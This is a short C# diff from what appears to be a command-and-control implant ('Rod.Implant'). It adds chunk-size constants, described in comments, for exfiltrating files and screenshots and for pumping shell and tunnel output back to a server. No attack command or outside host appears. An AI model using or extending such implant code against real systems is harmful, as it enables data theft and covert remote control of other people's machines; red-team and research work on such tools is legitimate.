@@ -12,6 +12,23 @@ namespace Rod.Implant.Internal;
 // and the server drops empty frames.
 internal static class Chunking
 {
+    /// <summary>
+    /// The largest data payload one ExfilChunk frame carries: 512 KiB, well
+    /// under the gRPC frame ceiling so a marshaled Frame still fits with room
+    /// to spare. Every artifact stream -- file pull, exfil, screenshot --
+    /// crosses the wire at this one ceiling so the server reassembles one
+    /// shape.
+    /// </summary>
+    public const int StreamChunkBytes = 512 * 1024;
+
+    /// <summary>
+    /// The channel-output pump buffer: one read is one ChannelOutput chunk,
+    /// so this is the largest output frame a live channel emits (16 KiB, well
+    /// inside the frame-layer sizing budget with protobuf overhead to spare).
+    /// The shell's stdio pump and the tunnel's socket pump share it.
+    /// </summary>
+    public const int ChannelOutputChunkBytes = 16 * 1024;
+
     public static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data, int chunkSize)
     {
         var chunks = new List<ExfilChunk>();
